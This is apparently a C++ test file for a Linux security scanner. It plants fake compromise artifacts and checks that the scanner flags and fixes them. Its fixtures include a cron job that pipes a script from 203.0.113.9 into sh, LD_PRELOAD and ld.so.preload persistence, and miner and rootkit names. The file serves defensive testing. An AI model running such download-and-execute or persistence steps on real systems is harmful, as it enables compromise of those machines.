#include "SecurityScanner.h"

#include <QCoreApplication>
#include <QDir>
#include <QFile>
#include <QFileInfo>
#include <QProcess>
#include <QSet>
#include <QTemporaryDir>

#include <sys/stat.h>
#include <unistd.h>

using namespace forkmesh::security;

namespace {

int failures = 0;

void check(bool condition, const QString &message)
{
    if (condition)
        qInfo("PASS: %s", qPrintable(message));
    else {
        qCritical("FAIL: %s", qPrintable(message));
        ++failures;
    }
}

void writeFile(const QString &path, const QString &contents)
{
    QDir().mkpath(QFileInfo(path).dir().path());
    QFile file(path);
    file.open(QIODevice::WriteOnly | QIODevice::Text);
    file.write(contents.toUtf8());
}

void writeBytes(const QString &path, const QByteArray &contents)
{
    QDir().mkpath(QFileInfo(path).dir().path());
    QFile file(path);
    file.open(QIODevice::WriteOnly);
    file.write(contents);
}

void setMode(const QString &path, mode_t mode)
{
    ::chmod(QFile::encodeName(path).constData(), mode);
}

void link(const QString &target, const QString &path)
{
    QDir().mkpath(QFileInfo(path).dir().path());
    ::symlink(QFile::encodeName(target).constData(), QFile::encodeName(path).constData());
}

void writeProcess(const QString &proc, const QString &pid, const QString &comm, const QByteArray &cmdline, const QString &ppid, const QString &exe)
{
    writeFile(proc + QStringLiteral("/%1/comm").arg(pid), comm + QLatin1Char('\n'));
    writeBytes(proc + QStringLiteral("/%1/cmdline").arg(pid), cmdline);
    writeFile(proc + QStringLiteral("/%1/status").arg(pid), QStringLiteral("Name:\t%1\nPPid:\t%2\n").arg(comm, ppid));
    if (!exe.isEmpty())
        link(exe, proc + QStringLiteral("/%1/exe").arg(pid));
}

QByteArray openSshKey(const QByteArray &cipher)
{
    QByteArray raw("openssh-key-v1\0", 15);
    const quint32 length = quint32(cipher.size());
    raw.append(char(length >> 24)).append(char(length >> 16)).append(char(length >> 8)).append(char(length));
    raw.append(cipher);
    raw.append(QByteArray(32, 'k'));
    return "-----BEGIN OPENSSH PRIVATE KEY-----\n" + raw.toBase64() + "\n-----END OPENSSH PRIVATE KEY-----\n";
}

const Finding *finding(const QList<Finding> &findings, const QString &id)
{
    for (const Finding &item : findings) {
        if (item.check.id == id)
            return &item;
    }
    return nullptr;
}

}

int main(int argc, char **argv)
{
    QCoreApplication app(argc, argv);
    const QList<CheckDefinition> catalog = checkCatalog();
    QSet<QString> ids;
    bool explained = true;
    for (const CheckDefinition &definition : catalog) {
        ids.insert(definition.id);
        if (definition.explanation.trimmed().size() < 20) {
            explained = false;
            qCritical("missing explanation: %s", qPrintable(definition.id));
        }
    }
    check(catalog.size() >= 300, QStringLiteral("the checkup includes at least 300 checks"));
    check(ids.size() == catalog.size(), QStringLiteral("every check has a unique id"));
    check(explained, QStringLiteral("every check explains what it is"));

    QTemporaryDir temporary;
    check(temporary.isValid(), QStringLiteral("a temporary fixture is available"));
    const QString root = temporary.path() + QStringLiteral("/root");
    const QString proc = temporary.path() + QStringLiteral("/proc");
    const QString home = root + QStringLiteral("/home/tester");
    writeFile(root + QStringLiteral("/etc/ufw/ufw.conf"), QStringLiteral("ENABLED=yes\n"));
    writeFile(root + QStringLiteral("/etc/default/ufw"), QStringLiteral("DEFAULT_INPUT_POLICY=\"ACCEPT\"\n"));
    writeFile(root + QStringLiteral("/usr/lib/libadore.so"), QStringLiteral("fixture"));
    writeFile(root + QStringLiteral("/usr/bin/apt-get"), QStringLiteral("fixture"));
    writeFile(root + QStringLiteral("/etc/shadow"), QStringLiteral("root:*:1:2:3:4:5:6\n"));
    QFile::setPermissions(root + QStringLiteral("/etc/shadow"), QFile::ReadOwner | QFile::ReadOther);
    writeFile(root + QStringLiteral("/etc/ssh/sshd_config"), QStringLiteral("Include /etc/ssh/sshd_config.d/*.conf\nPermitRootLogin no\nPasswordAuthentication no\nX11Forwarding yes\nMaxAuthTries 6\n"
                                                                         "Ciphers aes128-cbc,aes256-gcm@openssh.com\nMatch User backup\n    PermitTunnel no\n"));
    writeFile(root + QStringLiteral("/etc/ssh/sshd_config.d/10-local.conf"), QStringLiteral("X11Forwarding no\nLoginGraceTime 1m\n"));
    writeFile(root + QStringLiteral("/etc/login.defs"), QStringLiteral("ENCRYPT_METHOD YESCRYPT\nUMASK 022\nPASS_MAX_DAYS 99999\n"));
    writeFile(root + QStringLiteral("/etc/passwd"), QStringLiteral("root:x:0:0:root:/root:/bin/bash\ntoor:x:0:0::/root:/bin/sh\nguest::1001:1001::/home/guest:/bin/sh\n"));
    writeFile(root + QStringLiteral("/etc/group"), QStringLiteral("root:x:0:\ndocker:x:999:tester\n"));
    writeFile(root + QStringLiteral("/etc/sudoers"), QStringLiteral("Defaults env_reset\n%sudo ALL=(ALL:ALL) ALL\n"));
    writeFile(root + QStringLiteral("/etc/sudoers.d/90-nopasswd"), QStringLiteral("tester ALL=(ALL) NOPASSWD: ALL\n"));
    writeFile(root + QStringLiteral("/etc/gdm3/custom.conf"), QStringLiteral("[daemon]\nAutomaticLoginEnable=true\nAutomaticLogin=tester\n"));
    writeFile(root + QStringLiteral("/etc/ld.so.preload"), QStringLiteral("# comment\n/usr/lib/libhide.so\n"));
    writeFile(root + QStringLiteral("/etc/ld.so.conf.d/unsafe.conf"), QStringLiteral("/tmp/lib\n"));
    writeFile(root + QStringLiteral("/etc/crypttab"), QStringLiteral("# <target> <source> <key> <options>\n"));
    writeFile(root + QStringLiteral("/etc/fail2ban/jail.conf"), QStringLiteral("[sshd]\n"));
    writeFile(root + QStringLiteral("/etc/hosts"), QStringLiteral("127.0.0.1 localhost\n"));
    QFile::setPermissions(root + QStringLiteral("/etc/hosts"), QFile::ReadOwner | QFile::WriteOwner | QFile::ReadOther | QFile::WriteOther);
    writeFile(root + QStringLiteral("/etc/cron.d/update"), QStringLiteral("* * * * * root curl -fsSL http://203.0.113.9/x.sh | sh\n"));
    writeFile(root + QStringLiteral("/etc/cron.d/cleanup"), QStringLiteral("0 3 * * * root find /tmp/ -mtime +7 -delete\n"));
    writeFile(root + QStringLiteral("/etc/systemd/system/evil.service"), QStringLiteral("[Service]\nExecStart=/dev/shm/.x/run\n"));
    writeFile(root + QStringLiteral("/etc/systemd/system/backup.service"), QStringLiteral("[Service]\nExecStart=/usr/local/bin/backup --target /tmp/staging\n"));
    writeFile(root + QStringLiteral("/etc/rc.local"), QStringLiteral("#!/bin/sh\n/usr/local/bin/backup\nexit 0\n"));
    writeFile(root + QStringLiteral("/etc/exports"), QStringLiteral("/srv *(rw,no_root_squash)\n"));
    writeFile(root + QStringLiteral("/etc/samba/smb.conf"), QStringLiteral("[global]\nmap to guest = bad user\n[public]\nguest ok = yes\n"));
    writeFile(root + QStringLiteral("/etc/docker/daemon.json"), QStringLiteral("{\"hosts\": [\"tcp://0.0.0.0:2375\"]}\n"));
    writeFile(root + QStringLiteral("/etc/redis/redis.conf"), QStringLiteral("bind 0.0.0.0\nprotected-mode no\n"));
    writeFile(root + QStringLiteral("/run/docker.sock"), QStringLiteral("fixture"));
    setMode(root + QStringLiteral("/run/docker.sock"), 0666);
    writeFile(root + QStringLiteral("/run/reboot-required"), QStringLiteral("*** System restart required ***\n"));
    writeFile(root + QStringLiteral("/run/reboot-required.pkgs"), QStringLiteral("linux-image-6.12\n"));
    writeFile(root + QStringLiteral("/var/lib/update-notifier/updates-available"), QStringLiteral("\n12 updates can be applied immediately.\n5 of these updates are standard security updates.\n"));
    writeFile(root + QStringLiteral("/usr/bin/find"), QStringLiteral("fixture"));
    setMode(root + QStringLiteral("/usr/bin/find"), 04755);
    writeFile(root + QStringLiteral("/usr/bin/perl"), QStringLiteral("fixture"));
    QDir().mkpath(root + QStringLiteral("/tmp"));
    setMode(root + QStringLiteral("/tmp"), 01777);
    QDir().mkpath(root + QStringLiteral("/var/tmp"));
    setMode(root + QStringLiteral("/var/tmp"), 0777);
    writeFile(root + QStringLiteral("/dev/shm/.x/run"), QStringLiteral("fixture"));
    setMode(root + QStringLiteral("/dev/shm/.x/run"), 0755);
    writeFile(root + QStringLiteral("/sys/module/apparmor/parameters/enabled"), QStringLiteral("Y\n"));
    writeFile(root + QStringLiteral("/sys/kernel/security/lockdown"), QStringLiteral("[none] integrity confidentiality\n"));
    writeFile(root + QStringLiteral("/sys/module/ext4/initstate"), QStringLiteral("live\n"));
    writeFile(root + QStringLiteral("/sys/module/diamorphine/initstate"), QStringLiteral("live\n"));
    QDir().mkpath(root + QStringLiteral("/sys/module/kernel/parameters"));
    writeFile(root + QStringLiteral("/sys/class/net/lo/flags"), QStringLiteral("0x9\n"));
    writeFile(root + QStringLiteral("/sys/class/net/eth0/flags"), QStringLiteral("0x1103\n"));
    writeFile(root + QStringLiteral("/sys/class/net/docker0/flags"), QStringLiteral("0x1103\n"));
    writeBytes(root + QStringLiteral("/sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c"), QByteArray("\x06\x00\x00\x00\x01", 5));

    QDir().mkpath(home);
    setMode(home, 0755);
    writeBytes(home + QStringLiteral("/.ssh/id_ed25519"), openSshKey("none"));
    writeBytes(home + QStringLiteral("/.ssh/id_rsa"), "-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,00\n\nAAAA\n-----END RSA PRIVATE KEY-----\n");
    writeFile(home + QStringLiteral("/.ssh/authorized_keys"), QStringLiteral("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA laptop@home\n"));
    setMode(home + QStringLiteral("/.ssh"), 0700);
    setMode(home + QStringLiteral("/.ssh/id_ed25519"), 0644);
    setMode(home + QStringLiteral("/.ssh/id_rsa"), 0600);
    setMode(home + QStringLiteral("/.ssh/authorized_keys"), 0600);
    writeFile(home + QStringLiteral("/.netrc"), QStringLiteral("machine example.com login me password secret\n"));
    setMode(home + QStringLiteral("/.netrc"), 0640);
    writeFile(home + QStringLiteral("/.bashrc"), QStringLiteral("alias ll='ls -l'\nexport LD_PRELOAD=/home/tester/.lib/x.so\n"));

    writeFile(proc + QStringLiteral("/sys/kernel/kptr_restrict"), QStringLiteral("2\n"));
    writeFile(proc + QStringLiteral("/sys/kernel/tainted"), QStringLiteral("4096\n"));
    writeFile(proc + QStringLiteral("/sys/net/ipv4/ip_forward"), QStringLiteral("1\n"));
    writeFile(proc + QStringLiteral("/modules"), QStringLiteral("sctp 434176 2 - Live 0x0000000000000000\next4 1060864 1 - Live 0x0000000000000000\n"));
    writeFile(proc + QStringLiteral("/mounts"), QStringLiteral("tmpfs /tmp tmpfs rw,nosuid,relatime 0 0\ntmpfs /dev/shm tmpfs rw,nosuid,nodev,noexec 0 0\n"));
    const QString header = QStringLiteral("  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n");
    writeFile(proc + QStringLiteral("/net/tcp"), header + QStringLiteral("   0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 1\n"
                                                                         "   1: 0100007F:18EB 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 2\n"
                                                                         "   2: 00000000:115C 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 5\n"
                                                                         "   3: 0100007F:0539 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 7\n"
                                                                         "   4: 00000000:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 6\n"
                                                                         "   5: 0A00000F:0016 0A000002:C350 01 00000000:00000000 00:00000000 00000000  1000        0 8\n"));
    writeFile(proc + QStringLiteral("/net/tcp6"), header + QStringLiteral("   0: 00000000000000000000000001000000:1538 00000000000000000000000000000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 3\n"));
    writeFile(proc + QStringLiteral("/net/udp"), header + QStringLiteral("   0: 00000000:14E9 00000000:0000 07 00000000:00000000 00:00000000 00000000  1000        0 4\n"));
    writeProcess(proc, QStringLiteral("2"), QStringLiteral("kthreadd"), {}, QStringLiteral("0"), {});
    writeProcess(proc, QStringLiteral("100"), QStringLiteral("xmrig"), QByteArray("xmrig\0--donate-level\0", 21), QStringLiteral("1"), QStringLiteral("/tmp/.x/xmrig"));
    writeProcess(proc, QStringLiteral("101"), QStringLiteral("bash"), QByteArray("[kworker/0:1]\0", 14), QStringLiteral("1"), QStringLiteral("/usr/bin/bash"));
    writeProcess(proc, QStringLiteral("102"), QStringLiteral("firefox"), QByteArray("firefox\0", 8), QStringLiteral("1"), QStringLiteral("/usr/lib/firefox/firefox (deleted)"));
    writeProcess(proc, QStringLiteral("103"), QStringLiteral("sshd"), QByteArray("sshd: /usr/sbin/sshd\0", 21), QStringLiteral("1"), QStringLiteral("/usr/sbin/sshd"));
    writeProcess(proc, QStringLiteral("104"), QStringLiteral("smbd"), QByteArray("smbd\0", 5), QStringLiteral("1"), QStringLiteral("/usr/sbin/smbd"));
    link(QStringLiteral("socket:[1]"), proc + QStringLiteral("/103/fd/3"));
    link(QStringLiteral("socket:[5]"), proc + QStringLiteral("/100/fd/4"));

    const QList<Finding> findings = scan({root, proc, home, QStringLiteral("tester"), QStringLiteral("/usr/bin:/tmp:.")});
    const auto expect = [&](const QString &id, FindingState state, const QString &message) {
        const Finding *item = finding(findings, id);
        check(item && item->state == state, message + (item ? QStringLiteral(" (%1: %2)").arg(stateName(item->state), item->detail) : QStringLiteral(" (missing)")));
        return item;
    };
    const auto expectFix = [&](const QString &id, const QStringList &parts, bool elevated, const QString &message) {
        const Finding *item = finding(findings, id);
        bool ok = item && !item->fix.script.isEmpty() && item->fix.elevated == elevated && !item->fix.label.isEmpty() && !item->fix.description.isEmpty();
        for (const QString &part : parts)
            ok = ok && item->fix.script.contains(part);
        check(ok, message + (item ? QStringLiteral(" (%1)").arg(item->fix.script) : QStringLiteral(" (missing)")));
    };
    const auto expectUsage = [&](const QString &id, const QString &part, const QString &message) {
        const Finding *item = finding(findings, id);
        check(item && item->usage.contains(part), message + (item ? QStringLiteral(" (%1)").arg(item->usage) : QStringLiteral(" (missing)")));
    };

    expect(QStringLiteral("firewall-configured"), FindingState::Pass, QStringLiteral("an enabled UFW passes"));
    expect(QStringLiteral("firewall-default-deny"), FindingState::Warning, QStringLiteral("a firewall that accepts by default warns"));
    expectFix(QStringLiteral("firewall-default-deny"), {QStringLiteral("ufw default deny incoming")}, true, QStringLiteral("the default policy can be fixed"));
    expect(QStringLiteral("rootkit-adore"), FindingState::Critical, QStringLiteral("a rootkit artifact is critical"));
    expectFix(QStringLiteral("rootkit-adore"), {QStringLiteral("forkmesh-quarantine"), QStringLiteral("'/usr/lib/libadore.so'")}, true, QStringLiteral("a rootkit artifact is quarantined, not deleted"));
    expect(QStringLiteral("port-22"), FindingState::Review, QStringLiteral("a listening SSH port needs review"));
    expectUsage(QStringLiteral("port-22"), QStringLiteral("sshd (process 103)"), QStringLiteral("the program holding a port is named"));
    expectUsage(QStringLiteral("port-22"), QStringLiteral("1 active connection"), QStringLiteral("active connections show the port is in use"));
    expectFix(QStringLiteral("port-22"), {QStringLiteral("systemctl disable --now"), QStringLiteral("ssh")}, true, QStringLiteral("an exposed service can be stopped"));
    check(finding(findings, QStringLiteral("port-22"))->fix.caution.contains(QStringLiteral("remote sign-in")), QStringLiteral("stopping SSH warns about losing remote access"));
    expect(QStringLiteral("sysctl-kernel-kptr_restrict"), FindingState::Pass, QStringLiteral("a hardened sysctl passes"));
    expect(QStringLiteral("sysctl-net-ipv4-ip_forward"), FindingState::Warning, QStringLiteral("forwarding warns"));
    expectUsage(QStringLiteral("sysctl-net-ipv4-ip_forward"), QStringLiteral("docker0"), QStringLiteral("forwarding names the interfaces that need it"));
    expectFix(QStringLiteral("sysctl-net-ipv4-ip_forward"), {QStringLiteral("sysctl -w net.ipv4.ip_forward=0"), QStringLiteral("/etc/sysctl.d/90-forkmesh-security.conf")}, true,
              QStringLiteral("a sysctl fix applies now and persists"));
    check(finding(findings, QStringLiteral("sysctl-net-ipv4-ip_forward"))->fix.caution.contains(QStringLiteral("docker0")), QStringLiteral("the forwarding fix warns what loses network access"));
    expect(QStringLiteral("permissions-etc-shadow"), FindingState::Critical, QStringLiteral("a world-readable shadow file is critical"));
    expectFix(QStringLiteral("permissions-etc-shadow"), {QStringLiteral("chmod o-rwx '/etc/shadow'")}, true, QStringLiteral("a private file can be locked down"));
    expect(QStringLiteral("permissions-etc-krb5-keytab"), FindingState::Pass, QStringLiteral("an absent private file passes"));
    expect(QStringLiteral("ssh-permitrootlogin"), FindingState::Pass, QStringLiteral("a hardened SSH setting passes"));
    expect(QStringLiteral("port-6379"), FindingState::Pass, QStringLiteral("a TCP listener on IPv4 loopback passes"));
    expect(QStringLiteral("port-5432"), FindingState::Pass, QStringLiteral("a TCP listener on IPv6 loopback passes"));
    expect(QStringLiteral("udp-5353"), FindingState::Review, QStringLiteral("an exposed UDP listener needs review"));
    expect(QStringLiteral("udp-161"), FindingState::Pass, QStringLiteral("a closed UDP port passes"));
    expect(QStringLiteral("backdoor-4444"), FindingState::Critical, QStringLiteral("an exposed backdoor port is critical"));
    expectFix(QStringLiteral("backdoor-4444"), {QStringLiteral("kill 100")}, true, QStringLiteral("the program holding a backdoor port can be stopped"));
    expect(QStringLiteral("backdoor-1337"), FindingState::Review, QStringLiteral("a backdoor port on loopback needs review"));
    expect(QStringLiteral("backdoor-31337"), FindingState::Pass, QStringLiteral("a closed backdoor port passes"));
    const Finding *other = expect(QStringLiteral("port-other-tcp"), FindingState::Review, QStringLiteral("unknown exposed TCP ports need review"));
    check(other && other->detail.contains(QStringLiteral("8080")) && !other->detail.contains(QStringLiteral("4444")), QStringLiteral("other ports leave out the ports with their own check"));
    expect(QStringLiteral("port-other-udp"), FindingState::Pass, QStringLiteral("no unknown UDP port passes"));
    expect(QStringLiteral("ssh-x11forwarding"), FindingState::Pass, QStringLiteral("an SSH drop-in included before the main file wins"));
    expect(QStringLiteral("ssh-logingracetime"), FindingState::Pass, QStringLiteral("a time suffix is read as a duration within the limit"));
    expect(QStringLiteral("ssh-maxauthtries"), FindingState::Warning, QStringLiteral("an SSH limit above the maximum warns"));
    expectFix(QStringLiteral("ssh-maxauthtries"), {QStringLiteral("MaxAuthTries 4"), QStringLiteral("sshd -t"), QStringLiteral("00-forkmesh-security.conf")}, true,
              QStringLiteral("an SSH fix validates the configuration before reloading"));
    expect(QStringLiteral("ssh-permittunnel"), FindingState::Warning, QStringLiteral("a Match block value is not read as global"));
    expect(QStringLiteral("ssh-weak-crypto"), FindingState::Warning, QStringLiteral("a CBC cipher warns"));
    expect(QStringLiteral("login-encrypt-method"), FindingState::Pass, QStringLiteral("an accepted alternative value passes"));
    expect(QStringLiteral("login-umask"), FindingState::Warning, QStringLiteral("a permissive umask warns"));
    expectFix(QStringLiteral("login-umask"), {QStringLiteral("UMASK 027"), QStringLiteral("/etc/login.defs")}, true, QStringLiteral("login.defs settings can be fixed"));
    expect(QStringLiteral("login-pass-max-days"), FindingState::Warning, QStringLiteral("a never-expiring password policy warns"));
    expect(QStringLiteral("account-uid-zero"), FindingState::Critical, QStringLiteral("a second UID 0 account is critical"));
    expectFix(QStringLiteral("account-uid-zero"), {QStringLiteral("usermod -L"), QStringLiteral("'toor'")}, true, QStringLiteral("a second root account can be locked"));
    expect(QStringLiteral("account-empty-password"), FindingState::Critical, QStringLiteral("an empty password field is critical"));
    expectFix(QStringLiteral("account-empty-password"), {QStringLiteral("passwd -l"), QStringLiteral("'guest'")}, true, QStringLiteral("a passwordless account can be locked"));
    expect(QStringLiteral("account-duplicate-uid"), FindingState::Warning, QStringLiteral("a shared user ID warns"));
    expect(QStringLiteral("account-legacy-entries"), FindingState::Pass, QStringLiteral("no NIS entries passes"));
    expect(QStringLiteral("account-docker-group"), FindingState::Review, QStringLiteral("docker group membership needs review"));
    expectFix(QStringLiteral("account-docker-group"), {QStringLiteral("gpasswd -d"), QStringLiteral("'tester'")}, true, QStringLiteral("docker group members can be removed"));
    expect(QStringLiteral("account-sudo-nopasswd"), FindingState::Warning, QStringLiteral("a passwordless sudo rule warns"));
    expect(QStringLiteral("account-autologin"), FindingState::Warning, QStringLiteral("automatic desktop sign-in warns"));
    expectFix(QStringLiteral("account-autologin"), {QStringLiteral("AutomaticLoginEnable"), QStringLiteral("'/etc/gdm3/custom.conf'")}, true, QStringLiteral("automatic sign-in can be turned off"));
    expect(QStringLiteral("rootkit-ld-so-preload"), FindingState::Review, QStringLiteral("a preloaded library needs review"));
    expect(QStringLiteral("rootkit-hidden-module"), FindingState::Critical, QStringLiteral("a module hidden from /proc/modules is critical"));
    expect(QStringLiteral("module-sctp"), FindingState::Review, QStringLiteral("a loaded uncommon module needs review"));
    expectUsage(QStringLiteral("module-sctp"), QStringLiteral("In use"), QStringLiteral("a module in use says so"));
    expectFix(QStringLiteral("module-sctp"), {QStringLiteral("blacklist sctp"), QStringLiteral("modprobe -r sctp")}, true, QStringLiteral("a module can be blocked"));
    expect(QStringLiteral("module-dccp"), FindingState::Pass, QStringLiteral("an unloaded module passes"));
    expect(QStringLiteral("mount-tmp-nosuid"), FindingState::Pass, QStringLiteral("a present mount option passes"));
    expect(QStringLiteral("mount-tmp-nodev"), FindingState::Warning, QStringLiteral("a missing mount option warns"));
    expectFix(QStringLiteral("mount-tmp-nodev"), {QStringLiteral("mount -o remount,nodev '/tmp'")}, true, QStringLiteral("a mount option can be applied"));
    expect(QStringLiteral("mount-var-tmp-nosuid"), FindingState::Review, QStringLiteral("a folder that is not a separate mount needs review"));
    expect(QStringLiteral("writable-etc-hosts"), FindingState::Warning, QStringLiteral("a world-writable system file warns"));
    expect(QStringLiteral("permissions-etc-world-writable"), FindingState::Warning, QStringLiteral("the /etc sweep finds world-writable files"));
    expectFix(QStringLiteral("permissions-etc-world-writable"), {QStringLiteral("chmod o-w"), QStringLiteral("'/etc/hosts'")}, true, QStringLiteral("world-writable /etc files can be fixed"));
    expect(QStringLiteral("permissions-docker-socket"), FindingState::Critical, QStringLiteral("a Docker socket open to everyone is critical"));
    expect(QStringLiteral("permissions-path-variable"), FindingState::Critical, QStringLiteral("a world-writable PATH folder is critical"));
    expect(QStringLiteral("permissions-home-folder"), FindingState::Review, QStringLiteral("an open home folder needs review"));
    expectFix(QStringLiteral("permissions-home-folder"), {QStringLiteral("chmod o-rwx")}, false, QStringLiteral("the home folder is fixed without administrator rights"));
    expect(QStringLiteral("sticky-tmp"), FindingState::Pass, QStringLiteral("a sticky shared folder passes"));
    expect(QStringLiteral("sticky-var-tmp"), FindingState::Warning, QStringLiteral("a shared folder without the sticky bit warns"));
    expect(QStringLiteral("setuid-find"), FindingState::Critical, QStringLiteral("a set-user-ID escalation tool is critical"));
    expectFix(QStringLiteral("setuid-find"), {QStringLiteral("chmod u-s '/usr/bin/find'")}, true, QStringLiteral("the set-user-ID bit can be removed"));
    expect(QStringLiteral("setuid-perl"), FindingState::Pass, QStringLiteral("a normal interpreter passes"));
    expect(QStringLiteral("secrets-ssh-id_ed25519"), FindingState::Critical, QStringLiteral("a world-readable SSH key is critical"));
    expectFix(QStringLiteral("secrets-ssh-id_ed25519"), {QStringLiteral("chmod go-rwx")}, false, QStringLiteral("a key file is fixed without administrator rights"));
    expect(QStringLiteral("secrets-netrc"), FindingState::Warning, QStringLiteral("a group-readable credential file warns"));
    expect(QStringLiteral("secrets-aws-credentials"), FindingState::Pass, QStringLiteral("an absent credential file passes"));
    expect(QStringLiteral("secrets-ssh"), FindingState::Pass, QStringLiteral("a private SSH folder passes"));
    const Finding *passphrase = expect(QStringLiteral("secrets-ssh-key-passphrase"), FindingState::Review, QStringLiteral("a key without a passphrase needs review"));
    check(passphrase && passphrase->detail.contains(QStringLiteral("id_ed25519")) && !passphrase->detail.contains(QStringLiteral("id_rsa")),
          QStringLiteral("only the unencrypted key is listed"));
    expect(QStringLiteral("secrets-authorized-keys"), FindingState::Review, QStringLiteral("authorised SSH keys need review"));
    expectUsage(QStringLiteral("secrets-authorized-keys"), QStringLiteral("SSH is listening"), QStringLiteral("authorised keys say whether SSH is reachable"));
    expect(QStringLiteral("kernel-mac"), FindingState::Pass, QStringLiteral("enabled AppArmor passes"));
    expect(QStringLiteral("kernel-lockdown"), FindingState::Review, QStringLiteral("no kernel lockdown needs review"));
    expect(QStringLiteral("kernel-tainted"), FindingState::Review, QStringLiteral("a tainted kernel needs review"));
    expect(QStringLiteral("kernel-secure-boot"), FindingState::Pass, QStringLiteral("Secure Boot on passes"));
    expect(QStringLiteral("safeguard-brute-force-protection"), FindingState::Pass, QStringLiteral("a configured safeguard passes"));
    expect(QStringLiteral("safeguard-audit-daemon"), FindingState::Review, QStringLiteral("a missing safeguard needs review"));
    expectFix(QStringLiteral("safeguard-audit-daemon"), {QStringLiteral("apt-get install -y auditd")}, true, QStringLiteral("a missing safeguard can be installed"));
    expect(QStringLiteral("safeguard-disk-encryption"), FindingState::Review, QStringLiteral("a crypttab without entries needs review"));
    expect(QStringLiteral("safeguard-security-updates"), FindingState::Warning, QStringLiteral("waiting security updates warn"));
    expectFix(QStringLiteral("safeguard-security-updates"), {QStringLiteral("apt-get -y upgrade")}, true, QStringLiteral("waiting updates can be installed"));
    expect(QStringLiteral("safeguard-reboot-pending"), FindingState::Review, QStringLiteral("a pending restart needs review"));
    expect(QStringLiteral("malware-known-process"), FindingState::Critical, QStringLiteral("a miner process is critical"));
    expectFix(QStringLiteral("malware-known-process"), {QStringLiteral("kill -9 100")}, true, QStringLiteral("a miner process can be stopped"));
    expect(QStringLiteral("malware-masquerading-process"), FindingState::Critical, QStringLiteral("a process posing as a kernel thread is critical"));
    expect(QStringLiteral("malware-temp-process"), FindingState::Critical, QStringLiteral("a process running from /tmp is critical"));
    expect(QStringLiteral("malware-deleted-process"), FindingState::Review, QStringLiteral("a program running from a deleted file needs review"));
    expect(QStringLiteral("malware-executables-dev-shm"), FindingState::Warning, QStringLiteral("a program in /dev/shm warns"));
    expectFix(QStringLiteral("malware-executables-dev-shm"), {QStringLiteral("forkmesh-quarantine"), QStringLiteral("/dev/shm/.x/run")}, true, QStringLiteral("programs in /dev/shm can be quarantined"));
    expect(QStringLiteral("malware-executables-var-tmp"), FindingState::Pass, QStringLiteral("an empty temporary folder passes"));
    expect(QStringLiteral("network-promiscuous"), FindingState::Review, QStringLiteral("a capturing interface needs review"));
    check(!finding(findings, QStringLiteral("network-promiscuous"))->detail.contains(QStringLiteral("docker0")), QStringLiteral("container bridges are not reported as sniffers"));
    const Finding *cron = expect(QStringLiteral("persistence-cron"), FindingState::Critical, QStringLiteral("a download-and-run cron job is critical"));
    check(cron && cron->detail.contains(QStringLiteral("/etc/cron.d/update")) && !cron->detail.contains(QStringLiteral("cleanup")),
          QStringLiteral("a cleanup job that mentions /tmp is not flagged"));
    expectFix(QStringLiteral("persistence-cron"), {QStringLiteral("forkmesh-quarantine"), QStringLiteral("'/etc/cron.d/update'")}, true, QStringLiteral("a malicious cron file can be quarantined"));
    const Finding *systemd = expect(QStringLiteral("persistence-systemd"), FindingState::Critical, QStringLiteral("a service running from /dev/shm is critical"));
    check(systemd && !systemd->detail.contains(QStringLiteral("backup.service")), QStringLiteral("a service that only passes a /tmp argument is not flagged"));
    expectFix(QStringLiteral("persistence-systemd"), {QStringLiteral("daemon-reload")}, true, QStringLiteral("quarantining a service reloads systemd"));
    expect(QStringLiteral("persistence-autostart"), FindingState::Pass, QStringLiteral("no autostart entries passes"));
    expect(QStringLiteral("persistence-shell-startup"), FindingState::Critical, QStringLiteral("an LD_PRELOAD export in a shell start-up file is critical"));
    expect(QStringLiteral("persistence-rc-local"), FindingState::Review, QStringLiteral("commands in rc.local need review"));
    expect(QStringLiteral("persistence-library-path"), FindingState::Critical, QStringLiteral("a library folder in /tmp is critical"));
    expect(QStringLiteral("persistence-user-ssh-rc"), FindingState::Pass, QStringLiteral("no ~/.ssh/rc passes"));
    expect(QStringLiteral("service-nfs-root-squash"), FindingState::Critical, QStringLiteral("a world-writable no_root_squash export is critical"));
    expect(QStringLiteral("service-samba-guest"), FindingState::Warning, QStringLiteral("a guest Samba share warns"));
    expect(QStringLiteral("service-docker-tcp"), FindingState::Critical, QStringLiteral("Docker on TCP without TLS is critical"));
    expect(QStringLiteral("service-redis-auth"), FindingState::Critical, QStringLiteral("an open Redis without a password is critical"));
    expect(QStringLiteral("review-etc-samba-smb-conf"), FindingState::Review, QStringLiteral("a configured service needs review"));
    expectUsage(QStringLiteral("review-etc-samba-smb-conf"), QStringLiteral("smbd (process 104)"), QStringLiteral("a running service is named"));
    expectFix(QStringLiteral("review-etc-samba-smb-conf"), {QStringLiteral("systemctl disable --now"), QStringLiteral("smbd")}, true, QStringLiteral("a service can be turned off"));
    expectUsage(QStringLiteral("review-etc-redis-redis-conf"), QStringLiteral("Not running"), QStringLiteral("a stopped service says nothing uses it"));

    bool fixOnlyWhenNeeded = true;
    bool scriptsParse = true;
    for (const Finding &item : findings) {
        if ((item.state == FindingState::Pass || item.state == FindingState::Unavailable) && !item.fix.script.isEmpty())
            fixOnlyWhenNeeded = false;
        if (item.fix.script.isEmpty())
            continue;
        QProcess shell;
        shell.start(QStringLiteral("sh"), {QStringLiteral("-n"), QStringLiteral("-c"), item.fix.script});
        if (!shell.waitForFinished(5000) || shell.exitCode() != 0) {
            scriptsParse = false;
            qCritical("fix for %s does not parse: %s", qPrintable(item.check.id), qPrintable(QString::fromLocal8Bit(shell.readAllStandardError())));
        }
    }
    check(fixOnlyWhenNeeded, QStringLiteral("passing and unavailable checks offer no fix"));
    check(scriptsParse, QStringLiteral("every fix is a valid shell script"));
    check(shellQuote(QStringLiteral("it's")) == QStringLiteral("'it'\\''s'"), QStringLiteral("shell quoting escapes single quotes"));
    check(manualCommand(finding(findings, QStringLiteral("setuid-find"))->fix).startsWith(QStringLiteral("sudo sh -c '")), QStringLiteral("an elevated fix copies as a sudo command"));

